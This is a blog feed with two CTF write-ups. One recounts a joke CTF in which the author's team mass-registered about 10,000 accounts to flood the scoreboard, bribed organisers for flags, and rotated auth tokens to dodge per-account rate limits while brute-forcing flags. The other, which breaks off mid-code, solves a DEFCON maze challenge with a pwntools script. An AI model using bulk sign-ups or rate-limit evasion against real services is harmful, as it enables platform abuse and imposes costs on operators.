  &lt;img src=&#34;./img/cow_.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;


&lt;p&gt;The idea behind &amp;lsquo;account stuffing&amp;rsquo; is that if you own more than 50% of the accounts on the scoreboard, and they all sit on the same number of points, one of the accounts is guaranteed to be the median.&lt;/p&gt;
&lt;p&gt;The previous contender, &lt;a href=&#34;https://b01lers.com/&#34;&gt;b01lers&lt;/a&gt;, had already filled the scoreboard with around 1000 accounts. We figured that we can probably beat them, and devised a plan:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Automatically register and verify as many accounts as possible&lt;/li&gt;
&lt;li&gt;When the time comes, use script to submit a flag for each account&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Our main trick was that accounts with 0 points didn&amp;rsquo;t show up on the scoreboard, so no one would see our accounts until we started submitting flags for them.&lt;/p&gt;
&lt;p&gt;Huge thanks to &lt;a href=&#34;https://hexf.me&#34;&gt;HexF&lt;/a&gt; who registered and verified almost 10000 accounts with his &lt;a href=&#34;./files/reg-acct.py&#34;&gt;script&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;He was working on making a mail server specifically for catching verification emails, verifying them and storing the auth tokens for even faster account creation, until we were shut down&amp;hellip;&lt;/p&gt;
&lt;h3 id=&#34;registrations-disabled&#34;&gt;Registrations disabled&lt;/h3&gt;
&lt;p&gt;The admins eventually responded to our mass account creation by disabling registration, as it was costing them too much money.&lt;/p&gt;

  &lt;img src=&#34;./img/registration_disabled.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;


&lt;p&gt;By creating more than 10000 accounts, we cost the organisers over $20. Around 9500 of these accounts were successfully verified, meaning we owned around 85% of all registered accounts, and could flood the scoreboard at any time.&lt;/p&gt;
&lt;h3 id=&#34;flooding-the-scoreboard&#34;&gt;Flooding the scoreboard&lt;/h3&gt;
&lt;p&gt;Originally, we wanted to be stealthy and start submitting flags for the accounts right before the CTF ended, but since registrations are now disabled and we owned most the accounts, it didn&amp;rsquo;t really matter.&lt;/p&gt;
&lt;p&gt;I ran my &lt;a href=&#34;./files/auto-submitter.py&#34;&gt;script&lt;/a&gt; to spam submit a flag for all ~9500 accounts, and watched the scoreboard fill with joseph fan clubs.&lt;/p&gt;
&lt;p&gt;The script finished after 30 minutes, and the scoreboard was 111 pages long, consisting of 11000 teams.&lt;/p&gt;

  &lt;img src=&#34;./img/joseph_fan_clubs.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;The challenge we chose to submit, Geoguessr5, ended up with 9600 solves.&lt;/p&gt;

  &lt;img src=&#34;./img/osint_solves.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;Not only did we cost the organisers $20 by registering 10000 accounts, we also cost them some additional shipping fee for living on the other side of the world.&lt;/p&gt;

  &lt;img src=&#34;./img/fuck.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;Some truely cursed stuff. I wonder if they will upload the entire scoreboard to CTFTime&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Edit: &lt;a href=&#34;https://ctftime.org/event/2239&#34;&gt;they actually did it&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/iceberg4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;h2 id=&#34;signups-as-a-service&#34;&gt;Signups as a service&lt;/h2&gt;
&lt;p&gt;With registrations disabled, some newcomers weren&amp;rsquo;t able to play the CTF. &lt;a href=&#34;https://twitter.com/emilyposting_&#34;&gt;emily&lt;/a&gt; decided it would be funny to distribute some of our 9500 accounts for people to use.&lt;/p&gt;
&lt;p&gt;As well as pasting some login links in the cursed CTF discord, she setup a website to provide accounts. Being a DUCTF organiser, she came up with the domain name &lt;a href=&#34;https://logintocurse.duc.tf&#34;&gt;logintocurse.duc.tf&lt;/a&gt; which fit perfectly. Visitors would be redirected to a login link for one of our many accounts.&lt;/p&gt;

  &lt;img src=&#34;./img/iceberg5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;h2 id=&#34;pay-to-win-challenges&#34;&gt;Pay to Win challenges&lt;/h2&gt;
&lt;p&gt;It wouldn&amp;rsquo;t be a cursed CTF without some pay-to-win challenges. Thanks to &lt;a href=&#34;https://twitter.com/emilyposting_&#34;&gt;emily&lt;/a&gt; for sacrificing $15.36 AUD for this flag.&lt;/p&gt;

  &lt;img src=&#34;./img/discord_nitro.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;Another chal, literally called paytowin, increased the flag&amp;rsquo;s price by $1 after each purchase.&lt;/p&gt;

  &lt;img src=&#34;./img/paytowin.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;Thanks to &lt;a href=&#34;https://twitter.com/toasterpwn&#34;&gt;toasterpwn&lt;/a&gt; for his sacrifice of $17 AUD ($11 USD).&lt;/p&gt;

  &lt;img src=&#34;./img/usd.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/iceberg6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;h2 id=&#34;trading-flags-with-organisers--bribery&#34;&gt;Trading Flags with organisers / Bribery&lt;/h2&gt;
&lt;p&gt;Some of the challenges such as finding a kernel 0 day were straight up (almost) unsolvable. Therefore, &lt;a href=&#34;https://twitter.com/toasterpwn&#34;&gt;toasterpwn&lt;/a&gt; took initiative and bribed sky with an EMU shirt for the flag and hints for another challenge.&lt;/p&gt;

  &lt;img src=&#34;./img/toaster_trade.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;This first trade set off a cascade of bribery and trading. There was a challenge named &lt;code&gt;free-flag&lt;/code&gt; which (initially) gave a character of the flag every hour. Being impatient, we started to bribe admins for characters until &lt;a href=&#34;https://twitter.com/nullableVoidPtr&#34;&gt;avery&lt;/a&gt; accepted &lt;a href=&#34;https://twitter.com/takaradariku&#34;&gt;takarada&lt;/a&gt;&amp;rsquo;s request for guest access to the private Emu Exploit discord in exchange for the flag.&lt;/p&gt;

  &lt;img src=&#34;./img/ethical.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;



  &lt;img src=&#34;./img/takarada.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;



  &lt;img src=&#34;./img/ethical_.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;This wasn&amp;rsquo;t even takarada&amp;rsquo;s challenge, and I had already previously bribed &lt;a href=&#34;https://twitter.com/nootkroot&#34;&gt;kroot&lt;/a&gt;, the challenge author, to give us half the characters in exchange for the same thing. Too bad Emu Exploit&amp;rsquo;s team captain toasterpwn wasn&amp;rsquo;t online when I asked him for permission. He wasn&amp;rsquo;t either when takarada joined, but avery (below: &lt;a href=&#34;./img/cts_from_wish_dot_com.png&#34;&gt;cts from wish.com&lt;/a&gt;) ignored that.&lt;/p&gt;

  &lt;img src=&#34;./img/bruh.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;



  &lt;img src=&#34;./img/outbribed.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;Next, I again traded access to the Emu Exploit discord server with sky for the IDA Pro challenge.&lt;/p&gt;

  &lt;img src=&#34;./img/teddy_trade.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;The intended non-bribery solution was to &lt;a href=&#34;./img/ida1.png&#34;&gt;buy/give the IDA Pro subscription&lt;/a&gt; which costs couple hundreds to thousands of dollars.&lt;/p&gt;

  &lt;img src=&#34;./img/ida_pro_chal.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;Funny that it was &lt;a href=&#34;./img/ida4.png&#34;&gt;announced we actually bought the license&lt;/a&gt;, whereas it was just some &lt;a href=&#34;./img/ida3.png&#34;&gt;trolling&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The next day, instead of trading Emu related things, avery decided to &lt;a href=&#34;https://twitter.com/nullableVoidPtr/status/1774656004619456826&#34;&gt;initiate another trade&lt;/a&gt; with sky, providing images of a manga book of a specific genre in exchange for a flag and a hint for another challenge.&lt;/p&gt;

  &lt;img src=&#34;./img/avery_trade_2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 40%; &#34;  /&gt;



  &lt;img src=&#34;./img/funny_trade.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 90%; &#34;  /&gt;


&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/interesting_trade.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 90%; &#34;  /&gt;


&lt;p&gt;As we were nearing 69/99 flags submitted, we wanted a few more flags to get there. HexF traded some &lt;a href=&#34;https://downunderctf.com/&#34;&gt;DownUnderCTF&lt;/a&gt; hardware infra schematics (not for challenges) for a few flags / hints, getting us up to the nice number.&lt;/p&gt;

  &lt;img src=&#34;./img/hexf_trade.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;



  &lt;img src=&#34;./img/oops_leaked_a_flag.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;



  &lt;img src=&#34;./img/nice.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;&lt;del&gt;Nepotism&lt;/del&gt; Trading all the way.&lt;/p&gt;

  &lt;img src=&#34;./img/iceberg7.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;h2 id=&#34;flags-leaked-on-discord-server&#34;&gt;Flags leaked on Discord server&lt;/h2&gt;
&lt;p&gt;On the cursed CTF official discord, there was fittingly a channel named &lt;code&gt;#leaked-flags&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;./img/leaked_flags_channel.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;


&lt;p&gt;During the competition, it was revealed to us that some of the flags leaked by organisers in this channel were actually real flags.&lt;/p&gt;

  &lt;img src=&#34;./img/lmao.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;


&lt;p&gt;After realising this I scraped all messages from the channel, and used a script to try every message, unwrapped and wrapped with the flag format &lt;code&gt;cursedctf{}&lt;/code&gt; for every unsolved challenge. However, with a rate limit of around 1 submission every 3 seconds, it was quite slow.&lt;/p&gt;
&lt;p&gt;Luckily for us, rate limiting was done per account. We had 9500 of them. So I simply modified my script to rotate through different auth tokens for each submission, making it much faster. Sadly, although it submitted around 15000 flags, none of them worked for challenges we haven&amp;rsquo;t already solved.&lt;/p&gt;
&lt;p&gt;In total I&amp;rsquo;m aware of 2 challenges that had their actual flags leaked in this channel.&lt;/p&gt;

  &lt;img src=&#34;./img/iceberg8.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;h2 id=&#34;scuffed-challenges&#34;&gt;Scuffed challenges&lt;/h2&gt;
&lt;p&gt;Although most challenges in this CTF are intentionally cursed, I wanted to point out a few funny ones.&lt;/p&gt;
&lt;p&gt;This crypto challenges required you to sit through 32x 5 second ads, one for each encryption key. I wonder how much the challenge author made off this.&lt;/p&gt;

  &lt;img src=&#34;./img/money.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;


&lt;p&gt;This one was pretty funny. You had to make an upload a youtuber apology video (don&amp;rsquo;t apologise) for flag sharing to get the flag. Props to my teammate &lt;a href=&#34;https://twitter.com/ss2342&#34;&gt;ss23&lt;/a&gt; for making &lt;a href=&#34;https://www.youtube.com/watch?v=pAchERXGxTU&#34;&gt;this amazing video&lt;/a&gt;.&lt;/p&gt;

  &lt;img src=&#34;./img/apology.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 80%; &#34;  /&gt;


&lt;p&gt;Over a third of the challenges were OSINT - a detriment to most CTF players. Huge thanks to my teammate &lt;a href=&#34;https://steamcommunity.com/id/apow/&#34;&gt;lokifer&lt;/a&gt; for solving most of these!&lt;/p&gt;

  &lt;img src=&#34;./img/osint.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;Also note the 19 misc challenges. That&amp;rsquo;s right, half of the CTF weren&amp;rsquo;t even (real) challenges. I mean most of them aren&amp;rsquo;t anyways.&lt;/p&gt;

  &lt;img src=&#34;./img/iceberg9.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;p&gt;There were also assembly golfing challenges for leetcode challenges, where your code had to be shorter than the previous submission, and my team had some pretty cursed solutions for &lt;a href=&#34;./files/palindrome.asm&#34;&gt;palindrome_number&lt;/a&gt;, &lt;a href=&#34;./files/fizzbuzz.asm&#34;&gt;fizzbuzz&lt;/a&gt; and &lt;a href=&#34;./files/fizzbuzz.asm&#34;&gt;two_sum&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id=&#34;the-final-iceberg&#34;&gt;The Final Iceberg&lt;/h1&gt;

  &lt;img src=&#34;./img/iceberg_final.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;width: 60%; &#34;  /&gt;


&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This CTF was really fun due to the cursed nature of it. Huge thanks to my team for the effort they put in (there were actual non-troll hard challenges that they solved), and I&amp;rsquo;ll be looking forward to the (remote) finals!&lt;/p&gt;
&lt;p&gt;Let me know what other cursed moments you experienced during the CTF, or for any questions/corrections: DM &lt;code&gt;thesavageteddy&lt;/code&gt; on discord, or &lt;a href=&#34;https://twitter.com/teddyctf&#34;&gt;&lt;code&gt;teddyctf&lt;/code&gt;&lt;/a&gt; on Twitter/X.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>what-a-maze-meant - DEFCON Quals 2023 Writeup</title>
      <link>https://TheSavageTeddy.github.io/featured/what-a-maze-meant-defcon-2023-quals/</link>
      <pubDate>Tue, 30 May 2023 00:00:00 +0800</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/featured/what-a-maze-meant-defcon-2023-quals/</guid>
      <description>Table of Contents Overview - a brief summary of the event
Writeup - writeup of the challenge
Conclusion - final closing thoughts
Overview I played DEFCON Quals 2023 with if this doesn&#39;t work we&#39;ll get more for next year, a merger team with around 10 teams combined. Despite our best efforts, we placed 15th, just short of the top 12 that qualified, but given that it was our first year, I think we did pretty well, and I guess we&amp;rsquo;ll need to get more for next year!</description>
      <content>&lt;h1 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;#overview&#34;&gt;&lt;code&gt;Overview&lt;/code&gt;&lt;/a&gt; - a brief summary of the event&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#challenge-overview&#34;&gt;&lt;code&gt;Writeup&lt;/code&gt;&lt;/a&gt; - writeup of the challenge&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#conclusion&#34;&gt;&lt;code&gt;Conclusion&lt;/code&gt;&lt;/a&gt; - final closing thoughts&lt;/p&gt;
&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;I played DEFCON Quals 2023 with &lt;a href=&#34;https://ctftime.org/team/220769&#34;&gt;&lt;code&gt;if this doesn&#39;t work we&#39;ll get more for next year&lt;/code&gt;&lt;/a&gt;, a merger team with around 10 teams combined. Despite our best efforts, we placed &lt;code&gt;15th&lt;/code&gt;, just short of the top 12 that qualified, but given that it was our first year, I think we did pretty well, and I guess we&amp;rsquo;ll need to get more for next year!&lt;/p&gt;
&lt;p&gt;In this post is a quick writeup of &lt;code&gt;what-a-maze-meant&lt;/code&gt;, the first speedpwn challenge released in the LiveCTF section, where the quickest solves will earn the most points, so speed is key! It was a relatively easy challenge that together with some teamates, I solved pretty quickly. Enjoy!&lt;/p&gt;
&lt;h2 id=&#34;challenge-overview&#34;&gt;Challenge overview&lt;/h2&gt;
&lt;p&gt;We are given a binary, where the goal seems to be to complete the maze, by giving directions such as North, South, East and West. &lt;a href=&#34;https://dogbolt.org/?id=fda734c4-0d96-48dc-9247-1cafa71dc8bd&#34;&gt;Decompiling online&lt;/a&gt; we can dive into the code.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;c&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;main()&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-c&#34; &gt;&lt;code&gt;
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char v5; // [rsp&amp;#43;Bh] [rbp-3A5h] BYREF
  int i; // [rsp&amp;#43;Ch] [rbp-3A4h]
  int j; // [rsp&amp;#43;10h] [rbp-3A0h]
  unsigned int v8; // [rsp&amp;#43;14h] [rbp-39Ch]
  unsigned int v9; // [rsp&amp;#43;18h] [rbp-398h]
  int v10; // [rsp&amp;#43;1Ch] [rbp-394h]
  char v11[904]; // [rsp&amp;#43;20h] [rbp-390h] BYREF
  unsigned __int64 v12; // [rsp&amp;#43;3A8h] [rbp-8h]
  __int64 savedregs; // [rsp&amp;#43;3B0h] [rbp&amp;#43;0h] BYREF

  v12 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  v3 = time(0LL);
  srand(v3);
  for ( i = 0; i &amp;lt;= 29; &amp;#43;&amp;#43;i )
  {
    for ( j = 0; j &amp;lt;= 29; &amp;#43;&amp;#43;j )
      *((_BYTE *)&amp;amp;savedregs &amp;#43; 30 * i &amp;#43; j - 912) = 35;
  }
  puts(&amp;#34;Reticulating splines... &amp;#34;);
  generate_maze((__int64)v11, 1, 1, 1);
  puts(&amp;#34;\n\nWelcome to the maze!&amp;#34;);
  v8 = 1;
  v9 = 1;
  v10 = 1;
  while ( 1 )
  {
    if ( show_maze )
      display_maze((__int64)v11, v8, v9);
    printf(&amp;#34;You are in room (%d, %d)\n&amp;#34;, v8, v9);
    if ( v10 )
      randomDescription();
    else
      v10 = 1;
    puts(&amp;#34;Which would you like to do?&amp;#34;);
    if ( validwalk(*((_BYTE *)&amp;amp;savedregs &amp;#43; 30 * (int)(v8 - 1) &amp;#43; (int)v9 - 912)) )
      printf(&amp;#34;go (n)orth, &amp;#34;);
    if ( validwalk(*((_BYTE *)&amp;amp;savedregs &amp;#43; 30 * (int)(v8 &amp;#43; 1) &amp;#43; (int)v9 - 912)) )
      printf(&amp;#34;go (s)outh, &amp;#34;);
    if ( validwalk(*((_BYTE *)&amp;amp;savedregs &amp;#43; 30 * (int)v8 &amp;#43; (int)(v9 - 1) - 912)) )
      printf(&amp;#34;go (w)est, &amp;#34;);
    if ( validwalk(*((_BYTE *)&amp;amp;savedregs &amp;#43; 30 * (int)v8 &amp;#43; (int)(v9 &amp;#43; 1) - 912)) )
      printf(&amp;#34;go (e)ast, &amp;#34;);
    printf(&amp;#34;or (q) end the torment&amp;#34;);
    printf(&amp;#34;: &amp;#34;);
    __isoc99_scanf(&amp;#34; %c&amp;#34;, &amp;amp;v5);
    putchar(10);
    switch ( v5 )
    {
      case &amp;#39;a&amp;#39;:
        puts(&amp;#34;You cast arcane eye and send your summoned magical eye above the maze.&amp;#34;);
        show_maze = 1;
        v10 = 0;
        break;
      case &amp;#39;e&amp;#39;:
        if ( validwalk(*((_BYTE *)&amp;amp;savedregs &amp;#43; 30 * (int)v8 &amp;#43; (int)(v9 &amp;#43; 1) - 912)) )
          &amp;#43;&amp;#43;v9;
        break;
      case &amp;#39;n&amp;#39;:
        if ( validwalk(*((_BYTE *)&amp;amp;savedregs &amp;#43; 30 * (int)(v8 - 1) &amp;#43; (int)v9 - 912)) )
          --v8;
        break;
      case &amp;#39;q&amp;#39;:
        exit(0);
      case &amp;#39;s&amp;#39;:
        if ( validwalk(*((_BYTE *)&amp;amp;savedregs &amp;#43; 30 * (int)(v8 &amp;#43; 1) &amp;#43; (int)v9 - 912)) )
          &amp;#43;&amp;#43;v8;
        break;
      case &amp;#39;w&amp;#39;:
        if ( validwalk(*((_BYTE *)&amp;amp;savedregs &amp;#43; 30 * (int)v8 &amp;#43; (int)(v9 - 1) - 912)) )
          --v9;
        break;
      default:
        break;
    }
    if ( *((_BYTE *)&amp;amp;savedregs &amp;#43; 30 * (int)v8 &amp;#43; (int)v9 - 912) == 42 )
    {
      if ( rand() % 1213 == 1212 )
      {
        puts(&amp;#34;You successfully exit the maze!&amp;#34;);
        winner();
      }
      puts(&amp;#34;Just as you are about to exit, a displacer beast captures you. You die.&amp;#34;);
      exit(0);
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Running the provided binary and inputting &lt;code&gt;a&lt;/code&gt;, we can see the maze layout:&lt;/p&gt;

  &lt;img src=&#34;./img/mazelayout.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;There are already a lot of scripts online to solve mazes, and since we want to solve this as fast as possible for the most points, we use ChatGPT to generate a script for us:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;maze_solver.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
class MazeSolver:
    def __init__(self, maze):
        self.maze = maze
        self.rows = len(maze)
        self.cols = len(maze[0])
        self.visited = [[False for _ in range(self.cols)] for _ in range(self.rows)]
        self.directions = {&amp;#39;N&amp;#39;: (-1, 0), &amp;#39;S&amp;#39;: (1, 0), &amp;#39;W&amp;#39;: (0, -1), &amp;#39;E&amp;#39;: (0, 1)}
        self.path = []

    def solve(self, start_row, start_col):
        if self._dfs(start_row, start_col):
            return self._get_solution()
        else:
            return []

    def _dfs(self, row, col):
        if not self._is_valid(row, col):
            return False

        self.visited[row][col] = True
        self.path.append((row, col))

        if self.maze[row][col] == &amp;#39;*&amp;#39;:
            return True

        for direction in self.directions.values():
            next_row = row &amp;#43; direction[0]
            next_col = col &amp;#43; direction[1]
            if self._dfs(next_row, next_col):
                return True

        self.path.pop()
        return False

    def _is_valid(self, row, col):
        if row &amp;lt; 0 or row &amp;gt;= self.rows or col &amp;lt; 0 or col &amp;gt;= self.cols:
            return False
        if self.maze[row][col] == &amp;#39;#&amp;#39; or self.visited[row][col]:
            return False
        return True

    def _get_solution(self):
        solution = []
        for i in range(1, len(self.path)):
            prev_row, prev_col = self.path[i-1]
            curr_row, curr_col = self.path[i]
            if curr_row &amp;lt; prev_row:
                solution.append(&amp;#39;n&amp;#39;)
            elif curr_row &amp;gt; prev_row:
                solution.append(&amp;#39;s&amp;#39;)
            elif curr_col &amp;lt; prev_col:
                solution.append(&amp;#39;w&amp;#39;)
            elif curr_col &amp;gt; prev_col:
                solution.append(&amp;#39;e&amp;#39;)
        return solution


maze = [
    &amp;#34;#@#.................#.....#.#&amp;#34;,
    &amp;#34;#.#.#######.#######.#.###.#.#&amp;#34;,
    &amp;#34;#.#.#.#.....#.....#...#...#.#&amp;#34;,
    &amp;#34;#.#.#.#.#######.#.#####.###.#&amp;#34;,
    &amp;#34;#.#...#.#.......#.#...#.....#&amp;#34;,
    &amp;#34;#.#####.#.#####.###.#.#####.#&amp;#34;,
    &amp;#34;#.#...#.#.#.....#...#.......#&amp;#34;,
    &amp;#34;#.#.#.#.#.#######.###########&amp;#34;,
    &amp;#34;#...#...#.#.......#.......#.#&amp;#34;,
    &amp;#34;#########.#.#######.#####.#.#&amp;#34;,
    &amp;#34;#.#.......#...#...#...#...#.#&amp;#34;,
    &amp;#34;#.#.#.#######.#.#.###.#.###.#&amp;#34;,
    &amp;#34;#.#.#.....#...#.#.....#.....#&amp;#34;,
    &amp;#34;#.#.#####.#.###.###########.#&amp;#34;,
    &amp;#34;#.#.....#.#.#...#.#.......#.#&amp;#34;,
    &amp;#34;#.#####.#.#.#.###.#.###.###.#&amp;#34;,
    &amp;#34;#.......#...#...#...#.#...#.#&amp;#34;,
    &amp;#34;#.###########.#.#.###.###.#.#&amp;#34;,
    &amp;#34;#.#.......#...#.#.#.....#...#&amp;#34;,
    &amp;#34;#.#######.#.###.#.#.###.#####&amp;#34;,
    &amp;#34;#.......#.....#.#...#...#...#&amp;#34;,
    &amp;#34;#######.#######.#####.#####.#&amp;#34;,
    &amp;#34;#.....#.....#...#...#.#.....#&amp;#34;,
    &amp;#34;#.###.#####.#.###.###.#.###.#&amp;#34;,
    &amp;#34;#.#.#.....#.#.#.......#.#...#&amp;#34;,
    &amp;#34;#.#.###.###.#.#.#######.#.###&amp;#34;,
    &amp;#34;#.....#.......#.........#...#&amp;#34;,
    &amp;#34;####################*########&amp;#34;
]

solver = MazeSolver(maze)
solution = solver.solve(0, 1)
print(&amp;#34;Instructions to solve the maze:&amp;#34;)
print(solution)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;The script outputs the instructions required to solve the maze, starting from &lt;code&gt;@&lt;/code&gt; to the goal &lt;code&gt;*&lt;/code&gt;. Writing up a quick script in python we can verify this works:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
# MazeSolver() here
...
from pwn import *
import time

elf = context.binary = ELF(&amp;#34;./challenge&amp;#34;)
p = process()

p.recvuntil(b&amp;#34;Which would you like to do?&amp;#34;)
p.sendline(b&amp;#34;a&amp;#34;)
p.recvuntil(b&amp;#34;You cast arcane eye and send your summoned magical eye above the maze.&amp;#34;)

maze = p.recvuntil(b&amp;#34;You&amp;#34;, drop=True).decode().split(&amp;#34;\n&amp;#34;)
maze = [i for i in maze if &amp;#34;.&amp;#34; in i or &amp;#34;#&amp;#34; in i] # scuffed method to get maze
maze = maze[1:]

solver = MazeSolver(maze)
solution = solver.solve(0, 1)

for moves in solution:
    p.sendline(moves)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;



  &lt;img src=&#34;./img/maze_die.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;However, after reaching the goal we seem to just die. Reading the decompiled code further, we see why.&lt;/p&gt;
&lt;p&gt;The goal is to call the &lt;code&gt;winner()&lt;/code&gt; function, which gives us a shell:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __noreturn &lt;span style=&#34;color:#a6e22e&#34;&gt;winner&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;puts&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congratulations! You have solved the maze!&amp;#34;&lt;/span&gt;);
